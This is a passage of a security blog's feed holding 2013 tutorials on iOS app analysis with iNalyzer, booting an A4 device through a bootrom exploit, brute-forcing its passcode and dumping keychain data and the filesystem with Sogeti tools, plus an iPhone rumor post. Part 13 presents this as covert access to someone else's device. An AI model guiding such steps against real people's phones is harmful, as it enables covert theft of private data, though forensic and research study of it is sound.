&lt;p&gt;You will see a shell script named doxMe.sh. If you look inside it, you will notice that it automates the task of running Doxygen for us. Doxygen also runs Graphviz for generating graphs and the results are stored inside a folder with the name &lt;em&gt;html&lt;/em&gt;. Basically, iNalyzer has already stored all the class information for us inside a folder named &lt;em&gt;Reversing Files&lt;/em&gt; and it uses Doxygen and Graphviz to display the information in a much more presentable format.This shell script also opens up the &lt;em&gt;index.html&lt;/em&gt; file inside the created &lt;em&gt;html&lt;/em&gt; folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So lets run this shell script and let iNalyzer do all the things for us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/15.png&quot; alt=&quot;15&quot; /&gt; &lt;img src=&quot;/images/posts/ios15/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, iNalyzer will automatically open up the index.html file stored inside the html folder that was created. Here is what it looks like. In this case, i am using chrome. However, the developer of this tool personally recommended me to use firefox browser for runtime analysis as the other browsers may be buggy. As you can see from the image below, the first page gives a strings analysis of the entire app. It divides the strings into SQL and URL strings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also have a look at all the view controller classes used in the app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tapping on any of the view controllers will show you its methods and properties.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also look at the contents of the Info.plist file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you go under the Classes Tab and under &lt;em&gt;Class Index&lt;/em&gt; you will see a list of all the classes being used in the app. Some of them are Apple’s own classes while some are created by the developer of this app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you go under the &lt;em&gt;Class Hierarchy&lt;/em&gt; tab, you will see the class information and relationships being represented in a graphical format. This gives us a fair amount of knowledge on how this application works. These graphs are generated by the Graphviz tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you go to the files tab, you can have a look at all the interface files that iNalyzer generated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios15/23.png&quot; alt=&quot;23&quot; /&gt; &lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at static analysis of iOS applications using iNalyzer and how easy it makes our job. In the next article, we will look at how we can use iNalyzer further for runtime analysis of iOS applications.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;iNalyzer&lt;br /&gt;
&lt;a href=&quot;https://appsec-labs.com/iNalyzer&quot;&gt;https://appsec-labs.com/iNalyzer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 14 – Gathering information using Sogeti Data Protection tools</title>
   <link href="https://bitbrain.github.io/2013/09/17/ios-application-security-part-14-gathering-information-using-sogeti-data-protection-tools.html"/>
   <updated>2013-09-17T13:10:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/17/ios-application-security-part-14-gathering-information-using-sogeti-data-protection-tools</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can boot a device using a custom ramdisk using Sogeti Data protection tools. In this article, we will look at how we can use some of their tools to gather information from the device like fetching the keychain information, dumping the entire filesystem or even bruteforcing the passcode.&lt;/p&gt;

&lt;p&gt;Until the previous article, we had successfully set up a connection to the device using usbmux, ssh’ed into the device and had mounted the partitions. Here is what these partitions contain.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we are free to navigate inside these partitions and do whatever we want. As we can see, iphone data protection tools has put some scripts that we can use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use the bruteforce script. Currently the ipod is protected with a passcode “1234”. This also means that the keychain is protected with this passcode (as discussed in previous articles) and hence if we want to dump the keychain, then we have to find the passcode. So let’s run this script. As you can see, it starts bruteforcing the passcode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some time, we can see that is was successfully able to figure out the passcode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see that it writes these results to a plist file. This plist file is required by other python scripts, for e.g while dumping the keychain, the passcode is needed as the keychain information is protected with a passcode. There is another python script for bruteforcing the passcode stored inside the python_scripts directory inside the data protection tools repository.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it has figured out the passcode, it will create a folder with name as the UDID of your device and will store a plist file inside it containing information about the passcode and the keys that were derived. You can then use this plist file in other places where it is needed, for e.g while decrypting the keychain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the information contained in that plist file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that using an alphanumeric passcode will make it much more difficult for a successful bruteforce attack to be carried out and it will also protect the information in the keychain. However, most people are not aware of this and prefer to use a simple 4 digit numeric passcode.&lt;/p&gt;

&lt;p&gt;Anyways, coming back to the device there is another script &lt;em&gt;device_infos&lt;/em&gt; that dumps information about the device which contains information like the Serial number, the Mac address etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the most important python scripts is the ios_examiner python script. However, while running it, i got an error related to unicode strings and i was able to modify the python script using the help of &lt;a href=&quot;https://code.google.com/p/iphone-dataprotection/issues/detail?id=70#c2&quot;&gt;this&lt;/a&gt; link.&lt;/p&gt;

&lt;p&gt;Now run the ios_examiner python script without any commands. You will be shown an interpreter now where you can type commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see the full set of commands just by typing &lt;em&gt;help&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just typing keychain will dump the keychain.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/x.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, you will notice that it says &lt;em&gt;Keybag state: locked&lt;/em&gt; and there are some items that don’t display (shown as ?). These are the items that have higher protection attributes (for e.g AfterFirstUnlock) and they require the device passcode in order to be decrypted. But then we had already figured out the passcode right ? Well yes, but we used a different python script and the plist file containing passcode information was stored somewhere else. The most simple way to go forward is to just use the bruteforce script from the interpreter, give it the passcode, allow it to save the plist file in the current location and now you can use the keychain script again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the command &lt;em&gt;protected_files&lt;/em&gt; will give you the files that are protected with protection attributes != NSProtectionNone.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also dump the current partition which will create a .dmg file that you can use to later mount the partition and explore it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is another shell script that will dump the partition for you. It saves the created .dmg file inside a folder with name as the UDID of the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the .dmg file is fully generated, you can just click on it to mount it. Now you can explore the filesystem whenever you want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you can just reboot the device by issuing the reboot command and it will return the device back to its previous state. Make sure that the device is disconnected from you computer while doing so.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios14/16.png&quot; alt=&quot;16&quot; /&gt; &lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can use Sogeti data protection tools to gather various kinds of information from the device like keychain, protected files etc. We can also take a dump of the entire filesystem and analyze it later. This technique can be perfomed on any A4 device using a bootrom exploit (without jailbreaking it) and the device can then be rebooted to take it back to its normal state thereby preventing any normal user from knowing if anything happenned at all.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Iphone-dataprotection - iOS Forensics tools&lt;br /&gt;
&lt;a href=&quot;https://code.google.com/p/iphone-dataprotection/&quot;&gt;https://code.google.com/p/iphone-dataprotection/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 13 – Booting a custom Ramdisk using Sogeti Data Protection tools</title>
   <link href="https://bitbrain.github.io/2013/09/17/ios-application-security-part-13-booting-a-custom-ramdisk-using-sogeti-data-protection-tools.html"/>
   <updated>2013-09-17T13:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/09/17/ios-application-security-part-13-booting-a-custom-ramdisk-using-sogeti-data-protection-tools</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at how we can use Keychain-Dumper and Snoop-it to analyze and dump the contents of the Keychain from an iOS device. In this article, we will look at how we can boot a non-jailbroken device using a custom ramdisk and analyze the contents of the device.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;So what is the need of booting a device using a custom ramdisk ? Imagine a scenario where you only have temporary access to a device and you can’t jailbreak it. You just have access to the device for say like 30 minutes. In that time, you can boot the device using a custom ramdisk, brute force the passcode, and dump all the information for later analysis. The best thing is that the device does not need to be jailbroken in order for you to carry out this attack. Ofcouse, if the device is using a alphanumeric passcode, then it might take even more time to bruteforce the passcode. You can imagine this as similar to booting a windows machine with a Linux live CD, and then mounting the windows partition and then using the Linux OS to access the contents of the hard drive. However, booting a device using a custom ramdisk requires a bootrom exploit. The bootrom is the first significant code that runs on an iDevice. A bootrom exploit allows us to bypass the bootrom signature checks on the Low level bootloader and hence boot the device using a custom ramdisk. Such an exploit could also allow the user to run unsigned code and hence create an untethered jailbreak. A full list of all the publicly available bootrom exploits can be found &lt;a href=&quot;http://theiphonewiki.com/wiki/Category:Bootrom_Exploits&quot;&gt;here&lt;/a&gt;. A bootrom exploit once found cannot be fixed by Apple by releasing a new iOS version but can only be fixed by a new hardware release. At the time of writing of this article, there is no bootrom exploit discovered from A5 device or later. The bootrom exploit we will be using in this article will only work on A4 devices. I will be using an iPod touch 4th Generation in this article as it has an A4 chip. In this article, we will only be focussing on booting up the device using a custom ramdisk and we will focus on post exploitation steps in the next article.&lt;/p&gt;

&lt;p&gt;A very easy way would be to download &lt;a href=&quot;http://msftguy.blogspot.in/2012/01/automatic-ssh-ramdisk-creation-and.html&quot;&gt;this&lt;/a&gt; tool which allows for automatic SSH ramdisk creation. Its very simple to use and you check &lt;a href=&quot;http://www.youtube.com/watch?feature=player_embedded&amp;amp;v=1dh5loiX1dU&quot;&gt;this&lt;/a&gt; youtube video for more details.However, in this article, we will be looking at Sogeti data protection tools mainly because it provides a lot of powerful python scripts that we can leverage.&lt;/p&gt;

&lt;p&gt;A full set of instructions on how to boot using the custom ramdisk can be found &lt;a href=&quot;https://code.google.com/p/iphone-dataprotection/wiki/README&quot;&gt;here&lt;/a&gt;. We will be following the same instructions on a system running Mac OSX 10.8.4.&lt;/p&gt;

&lt;p&gt;First of all, make sure that Mercurial is installed on your system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then create a new directory and navigate inside it. Then install the &lt;em&gt;ldid&lt;/em&gt; tool, make sure its executable and move it to &lt;em&gt;/usr/bin&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we need to create some symlinks. Please note that in the second command shown below, we have created a symlink to the Xcode.App folder. Usually, if you are an iOS developer and you have multiple versions of Xcode installed on your system, you might have named them differently, for e.g Xcode-4.5.2 or Xcode-5.1 in your Applications folder. Hence, please be aware that this command may fail in that case and you will get an error later that says &lt;em&gt;iOS SDK not found&lt;/em&gt;. A good solution would be to just rename the Xcode app in your applications folder as just &lt;em&gt;Xcode&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we need to install OSXFuse which is used to create file systems for OS X.Depending on the operating system that you are running, some versions of OSXFuse may not be compatible. Hence, be sure to download the version that works with your operating system. In my case, i am downloading version 2.5.4 which works well with OS X 10.8.4.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/4.png&quot; alt=&quot;4&quot; /&gt; &lt;img src=&quot;/images/posts/ios13/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then there are certain python modules that you need to install.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step is to build the custom ramdisk and kernel. For that, we need to clone the iphone data protection repository first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we use the following command to create the filesystem.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we download redsn0w and copy the Keys.plist file in the present directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you need to download the IPSW file for any version of iOS 5. It doesn’t matter which operating system the target device is currently running. You can download the IPSW files from &lt;a href=&quot;http://theiphonewiki.com/wiki/Firmware&quot;&gt;here&lt;/a&gt; depending on your device. Once the IPSW file is downloaded, copy it into the current directory. Then use the following command to patch the kernel and give the argument as the IPSW file that you just downloaded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will create a .sh file that we can use to build the ramdisk. Let’s run it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the ramdisk has been created, you will be shown the command that you need to use to boot the ramdisk.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s use this command to boot with our custom ramdisk and the patched kernel. Please note that even though the command started with &lt;em&gt;redsn0w&lt;/em&gt;, we have replaced that with the redsnow binary by navigating inside the redsn0w folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will open up redsn0w.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, my iPod is connected to the device but not switched off. Hence let me switch it off as requested by redsn0w. Once it is switched off, the next button on redsn0w will become enabled. Click on it and you will see that redsn0w will ask you to put your device in DFU mode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s follow the instructions that redsn0w gives. Once your device has entered DFU mode, you will see that redsn0w has now begun injecting the exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It will then reboot the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how your device will look like. After some time, you will see a big OK sign on the device that confirms that the exploit has been successful and the custom ramdisk has successfully been started.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/18.jpg&quot; alt=&quot;18&quot; /&gt; &lt;img src=&quot;/images/posts/ios13/19.jpg&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The data protection tools also contains a python utility called &lt;em&gt;usbmux&lt;/em&gt; that we can now use to access the device over ssh. Let’s set up the relaying using the &lt;em&gt;tcprelay&lt;/em&gt; python script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now on a seperate tab, we can ssh to the localhost at port number 2222 and usbmux will forward the connection to the remote device connected over USB on port number 22. Please note that your device should be connected to your computer over USB in order for this to take place. Then type &lt;em&gt;ls&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will see a mount_partitions shell script. Let’s use that to mount the partitions. Then let’s navigate to the root directory and there we can see two partitions, &lt;em&gt;mnt1&lt;/em&gt; and &lt;em&gt;mnt2&lt;/em&gt;. We can now go inside them and explore the filesystem.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios13/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Congratulations ! We have successfully booted the device using a custom ramdisk and now have the capability to explore the filesystem.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can boot a device using a custom ramdisk and use it to explore the filesystem of that device. In the next article, we will look at the different tools that Sogeti data protection tools provide and how we can use them to perform various tasks like brute forcing the passcode, dumping the keychain or even take a backup of the filesystem.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Iphone-dataprotection - iOS Forensics tools&lt;br /&gt;
&lt;a href=&quot;https://code.google.com/p/iphone-dataprotection/&quot;&gt;https://code.google.com/p/iphone-dataprotection/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>What to expect from the new iPhone (5S/5C) - Rumor roundup</title>
   <link href="https://bitbrain.github.io/2013/08/23/what-to-expect-from-iphone-5s-slash-5c.html"/>
   <updated>2013-08-23T14:44:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/08/23/what-to-expect-from-iphone-5s-slash-5c</id>
   <content type="html">&lt;p&gt;The smartphone world is buzzing about rumors for the new Iphone. The new Iphone is rumored to be launched on September 10 in an event in San Francisco, which means that the invitations for the event would be sent to the press sometime around September 3. This time, Apple is reported to be releasing two models of iPhone, one is the iPhone 5s and the other a cheaper variant, reportedly named as the iPhone 5C. Here is a complete rumor roundup from multiple sources about the next generation iPhone.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;fingerprint-sensor&quot;&gt;Fingerprint Sensor&lt;/h2&gt;

&lt;p&gt;There is absolutely no doubt regarding the fact that the new iPhone will come with a biometric fingerprint sensor.Code for biometric scanning has already been discovered in the beta versions of IOS 7 (by Hamza Sood) released to developers. &lt;img src=&quot;http://asset3.cbsistatic.com/cnwk.1d/i/tim2/2013/07/29/BQXGg5-CUAAiXp6_610x585.jpg%3Alarge&quot; alt=&quot;&quot; /&gt;  The sensor will be placed just beneath the home button. To authenticate you just have to place your thumb on the home button. If this technology is there in the next iPhone, it will solve many complex problems. Users don’t need to enter or even remember a passcode everytime. Now we don’t have to enter our Apple ID password everytime we purchase an app, something i think was very frustrating but also necessary for security related purposes. The Keychain information that is protected with a passcode will now be protected with a metric related to your fingerprint. And most of all, the technology will be very simple to use which i think will make it very popular. Everyones knows that when &lt;a href=&quot;http://www.forbes.com/sites/karstenstrauss/2012/07/27/apple-acquires-authentec-a-fingerprint-as-a-key/&quot;&gt;Apple acquired Authentec&lt;/a&gt; for $356 million, a company known for having developed technology to authenticate users based on fingerprints that can actually be embedded into IOS devices, they must have done it for a very good reason.&lt;/p&gt;

&lt;h2 id=&quot;ios-7&quot;&gt;IOS 7&lt;/h2&gt;

&lt;p&gt;Again, there is absolutely no doubt about the fact that the new Iphone will come with IOS 7 preinstalled. If you haven’t seen it yet, check out this video from WWDC 2013 introducing the key features of IOS 7.&amp;lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/zcebqUdvDrw&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;

&lt;h2 id=&quot;an-a7-chip&quot;&gt;An A7 Chip&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://cdn.macrumors.com/article-new/2013/04/a7_mockup.jpg&quot; alt=&quot;&quot; /&gt; Photo Credit: &lt;a href=&quot;http://macrumors.com&quot;&gt;Macrumors&lt;/a&gt; Surely the new Iphone will be powered by a new A7 chip. Over the last few years, Apple has been able to increase the processing speed of the new chip to twice as that of that of the previous chip. I expect it to be the same way this year as well. The interesting part is that &lt;a href=&quot;http://www.idownloadblog.com/2013/07/31/ios-7-code-reveals-a7-chip/&quot;&gt;Apple has again been working with Samsung&lt;/a&gt; in developing this chip.&lt;/p&gt;

&lt;h2 id=&quot;other-hardware-improvements&quot;&gt;Other Hardware improvements&lt;/h2&gt;

&lt;p&gt;We already know about the software improvements that the new Iphone is suppossed to have (IOS 7). The new Iphone is reported to come with the same amount of RAM (1 GB) as the previous generation iPhones. The camera is reported to have a dual-LED flash for taking better pictures in low light. However, the rumors suggest that it will be an 8 MP camera again. Personally, i would like to see the number go up.&lt;/p&gt;

&lt;h2 id=&quot;a-new-cheaper-variant-and-more-colours&quot;&gt;A new cheaper variant and more colours&lt;/h2&gt;

&lt;p&gt;This time, Apple is also rumored to be coming out with a cheaper variant of the current Iphone, probably named as iPhone 5C, which will have a plastic back instead of an aluminium one. This will help Apple is cutting down the manufacturing costs and hence make the iPhone 5C cheaper than its current lineup of iPhones. It is also rumored that this cheaper variant of the iPhone will be coated in Liquid Metal, thereby making it scratch resistant, as is supposedly shown in the video below. &lt;a href=&quot;http://www.zdnet.com/blog/apple/why-is-apple-licensing-liquidmetal-can-you-say-bounceable-iphones/7909&quot;&gt;Apple’s acquisition of Liquid Metal&lt;/a&gt; did make a lot of news 3 years ago, but since then we haven’t seen the technology being used in Apple products. Maybe now is the time.&amp;lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/cOhAzd0tp28&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;It is also rumored that the iPhone 5S will come in black, white and champagne gold colour whereas the iPhone 5C will have much more colours to offer to its users.&lt;/p&gt;

&lt;h2 id=&quot;one-more-thing&quot;&gt;One More thing&lt;/h2&gt;

&lt;p&gt;This comes from the era when Steve Jobs was the CEO of Apple. Apple had always been successful at hiding that “One more thing” from the people and most of the time it has proved to be the most groundbreaking feature of that product. However, since the passing of late Steve Jobs, we haven’t seen that “One more thing” being mentioned in Apple presentations. Hoping it to be the other way round this time. &amp;lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/2QQLyS0MnzM&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;In any case, there is not much time left. If the rumored date Sept 10 is true, invitations to the press will be sent by 3rd Sept and there will definitely be some hint in the image that Apple usually sends out with their invitations. Looking forward to the event ….&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 12 – Dumping Keychain Data</title>
   <link href="https://bitbrain.github.io/2013/08/20/ios-application-security-part-12-dumping-keychain-data.html"/>
   <updated>2013-08-20T07:32:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/08/20/ios-application-security-part-12-dumping-keychain-data</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at the different ways in which we could analyze the network traffic and the api calls being made through an iOS application. In this article, we will look at how we can dump the contents of the Keychain from an iOS device.&lt;/p&gt;

&lt;h2 id=&quot;keychain-basics&quot;&gt;Keychain Basics&lt;/h2&gt;

&lt;p&gt;According to Apple, a Keychain in an iOS device is a secure storage container that can be used to store sensitive infromation like usernames, passwords,network passwords, authentication tokens for different applications. Apple itself uses the Keychain to store Wi-fi network passwords, VPN credentials etc. It’s a sqlite database file located at &lt;em&gt;/private/var/Keychains/keychain-2.db&lt;/em&gt; and all the data stored in it is encrypted. Developers usually want to leverage this feature of the operating system to store credentials rather than storing it themseleves in NSUserDefaults, plist files etc. The reason for this could be that the developer may not want the user to log in everytime and hence store the authentication information somewhere in the device and use it to log in the user automatically whenver the user opens up the app again. The keychain information for every app is stored outside of its sandbox.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It is also possible to share keychain data between applications through keychain access groups. This group has to be specified while saving the data in the keychain. The best way of saving data in Keychain is to use the &lt;em&gt;KeychainItemWrapper&lt;/em&gt; class by Apple. A sample project can be found &lt;a href=&quot;http://developer.apple.com/library/ios/#samplecode/GenericKeychain/Listings/Classes_KeychainItemWrapper_h.html&quot;&gt;here&lt;/a&gt;. The first step is to create an instance of the class.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KeychainItemWrapper *wrapper = [[KeychainItemWrapper alloc] initWithIdentifier:@&quot;Password&quot; accessGroup:nil];&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The identifier will help in fetching this information from the keychain later. In case you have to share information across applications, then you will have to specify an access group. Applications with the same access group can have access to the same keychain information.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KeychainItemWrapper *wrapper = [[KeychainItemWrapper alloc] initWithIdentifier:@&quot;Account Number&quot; accessGroup:@&quot;YOUR_APP_ID_HERE.com.yourcompany.GenericKeychainSuite&quot;];&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To save info in the keychain, just use the setObject:forKey: method. In this case &lt;em&gt;(id)kSecAttrAccount&lt;/em&gt; is a predefined key that we can use to define the account name for which we are storing the data. The &lt;em&gt;kSecClass&lt;/em&gt; specifies the kind of information we are storing, in this case a generic password.The &lt;em&gt;kSecValueData&lt;/em&gt; key can be used to store any form of data, in this case a password.&lt;/p&gt;

&lt;pre&gt;	[keychainItemWrapper setObject:kSecClassGenericPassword forKey:(id)kSecClass];
	[wrapper setObject:@&quot;username&quot; forKey:(id)kSecAttrAccount];
	[keychainItemWrapper setObject:@&quot;password&quot;forKey:(id)kSecValueData];
	[wrapper setObject:(id)kSecAttrAccessibleAlwaysThisDeviceOnly forKey:(id)kSecAttrAccessible];

&lt;/pre&gt;

&lt;p&gt;The &lt;em&gt;kSecAttrAccessible&lt;/em&gt; variable is used to specify when does the application need access to that data. We should be careful while using this option and use the most restrictive option. There are six possible values for this key which can be found in the screenshot below from Apple’s &lt;a href=&quot;http://developer.apple.com/library/mac/#documentation/Security/Conceptual/keychainServConcepts/iPhoneTasks/iPhoneTasks.html#//apple_ref/doc/uid/TP30000897-CH208-SW1&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ofcourse, we should never use &lt;em&gt;kSecAttrAccessibleAlways&lt;/em&gt;. A safe option to go for would be &lt;em&gt;kSecAttrAccessibleWhenUnlocked&lt;/em&gt;. Also, there are options that end with &lt;em&gt;ThisDeviceOnly&lt;/em&gt;. If this option is chosen, the data is encrypted with a hardware specific key and hence could not be transferred to or viewed from another device. Even though they enforce additional security, it might not be a good idea to use them unless you have a good reason to not allow the migration of data between backups.&lt;/p&gt;

